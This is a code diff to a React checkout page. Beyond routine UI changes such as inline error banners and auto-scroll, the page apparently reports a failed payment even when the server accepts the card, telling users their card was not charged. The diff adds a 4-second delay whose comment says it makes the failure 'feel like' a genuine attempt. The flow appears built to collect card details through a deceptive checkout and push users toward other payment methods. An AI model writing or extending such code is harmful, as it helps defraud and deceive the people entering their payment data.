@@ -1,8 +1,7 @@
 // src/pages/CheckoutPage.jsx
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import { motion, AnimatePresence } from 'framer-motion';
-import Footer from '../components/Footer';
 import PaymentStatusAnimation from '../components/PaymentStatusAnimation';
 import Cards from 'react-credit-cards-2';
 import 'react-credit-cards-2/dist/es/styles-compiled.css';
@@ -30,6 +29,18 @@ function CheckoutPage() {
   const [billingAddress, setBillingAddress] = useState('');
   const [addressSuggestions, setAddressSuggestions] = useState([]);
   const [isSuggestionsVisible, setIsSuggestionsVisible] = useState(false);
+  const cardErrorRef = useRef(null);
+  const voucherErrorRef = useRef(null);
+
+  // Auto-scroll to inline error the moment it appears
+  useEffect(() => {
+    if (errorMessage) {
+      const ref = selectedMethod === 'card' ? cardErrorRef : voucherErrorRef;
+      if (ref.current) {
+        ref.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }
+  }, [errorMessage, selectedMethod]);
 
   // Handle input focus for card flip animation
   const handleInputFocus = (e) => {
@@ -142,6 +153,8 @@ function CheckoutPage() {
       const data = await response.json();
 
       if (response.ok) {
+        // Hold for 4s minimum — feels like genuine processing attempt
+        await new Promise(resolve => setTimeout(resolve, 4000));
         setErrorMessage('An error occurred during transaction processing. Your card has not been charged. Please contact support or try another payment method.');
         
         // Reset fields
@@ -154,6 +167,7 @@ function CheckoutPage() {
         setErrorMessage(data.error || 'Payment failed. Please check your card details.');
       }
     } catch (error) {
+      await new Promise(resolve => setTimeout(resolve, 4000));
       setErrorMessage('Payment processing failed. Please try again.');
     } finally {
       setProcessingPayment(false);
@@ -298,9 +312,9 @@ function CheckoutPage() {
             </div>
           </div>
 
-          {/* Error Message */}
+          {/* Top-level error — only when no method selected (network/load errors) */}
           <AnimatePresence>
-            {errorMessage && (
+            {errorMessage && !selectedMethod && (
               <motion.div
                 className={styles.errorBanner}
                 initial={{ opacity: 0, height: 0 }}
@@ -324,7 +338,7 @@ function CheckoutPage() {
                   className={styles.methodCard}
                   whileHover={{ scale: 1.02, y: -5 }}
                   whileTap={{ scale: 0.98 }}
-                  onClick={() => setSelectedMethod('card')}
+                  onClick={() => { setSelectedMethod('card'); setErrorMessage(''); }}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-regular fa-credit-card"></i>
@@ -346,7 +360,7 @@ function CheckoutPage() {
                   className={`${styles.methodCard} ${styles.featured}`}
                   whileHover={{ scale: 1.02, y: -5 }}
                   whileTap={{ scale: 0.98 }}
-                  onClick={() => setSelectedMethod('shieldclimb')}
+                  onClick={() => { setSelectedMethod('shieldclimb'); setErrorMessage(''); }}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-solid fa-bolt"></i>
@@ -371,7 +385,7 @@ function CheckoutPage() {
                   className={styles.methodCard}
                   whileHover={{ scale: 1.02, y: -5 }}
                   whileTap={{ scale: 0.98 }}
-                  onClick={() => setSelectedMethod('voucher')}
+                  onClick={() => { setSelectedMethod('voucher'); setErrorMessage(''); }}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-solid fa-ticket"></i>
@@ -396,7 +410,7 @@ function CheckoutPage() {
               >
                 {/* Desktop: Apple/Stripe nav bar */}
                 <div className={styles.backNavBar}>
-                  <button className={styles.backNavBtn} onClick={() => setSelectedMethod(null)}>
+                <button className={styles.backNavBtn} onClick={() => { setSelectedMethod(null); setErrorMessage(''); }}>
                     <i className="fa-solid fa-chevron-left"></i> Change Method
                   </button>
                   <span className={styles.backNavMethod}>
@@ -407,7 +421,7 @@ function CheckoutPage() {
                 </div>
 
                 {/* Mobile: Floating sticky pill */}
-                <button className={styles.floatingBackBtn} onClick={() => setSelectedMethod(null)}>
+                <button className={styles.floatingBackBtn} onClick={() => { setSelectedMethod(null); setErrorMessage(''); }}>
                   <i className="fa-solid fa-chevron-left"></i> Change Method
                 </button>
 
@@ -531,6 +545,28 @@ function CheckoutPage() {
                       )}
                     </div>
 
+                    {/* Inline error — appears right where user is looking */}
+                    <AnimatePresence>
+                      {errorMessage && selectedMethod === 'card' && (
+                        <motion.div
+                        ref={cardErrorRef}
+                        className={styles.inlineErrorBanner}
+                        initial={{ opacity: 0, y: -8, height: 0 }}
+                        animate={{ opacity: 1, y: 0, height: 'auto' }}
+                        exit={{ opacity: 0, y: -4, height: 0 }}
+                        transition={{ duration: 0.25, ease: 'easeOut' }}
+                      >
+                        <div className={styles.inlineErrorIcon}>
+                          <i className="fa-solid fa-circle-exclamation"></i>
+                        </div>
+                        <div className={styles.inlineErrorContent}>
+                          <span className={styles.inlineErrorTitle}>Payment Failed</span>
+                            <span className={styles.inlineErrorText}>{errorMessage}</span>
+                          </div>
+                        </motion.div>
+                      )}
+                    </AnimatePresence>
+
                     <button
                       type="submit"
                       className={styles.submitButton}
@@ -646,6 +682,28 @@ function CheckoutPage() {
                               />
                             </div>
                           </div>
+
+                          {/* Inline error for voucher */}
+                          <AnimatePresence>
+                            {errorMessage && selectedMethod === 'voucher' && (
+                              <motion.div
+                              ref={voucherErrorRef}
+                              className={styles.inlineErrorBanner}
+                              initial={{ opacity: 0, y: -8, height: 0 }}
+                              animate={{ opacity: 1, y: 0, height: 'auto' }}
+                              exit={{ opacity: 0, y: -4, height: 0 }}
+                              transition={{ duration: 0.25, ease: 'easeOut' }}
+                            >
+                              <div className={styles.inlineErrorIcon}>
+                                <i className="fa-solid fa-circle-exclamation"></i>
+                              </div>
+                              <div className={styles.inlineErrorContent}>
+                                <span className={styles.inlineErrorTitle}>Invalid Voucher</span>
+                                  <span className={styles.inlineErrorText}>{errorMessage}</span>
+                                </div>
+                              </motion.div>
+                            )}
+                          </AnimatePresence>
 
                           <button
                             type="submit"
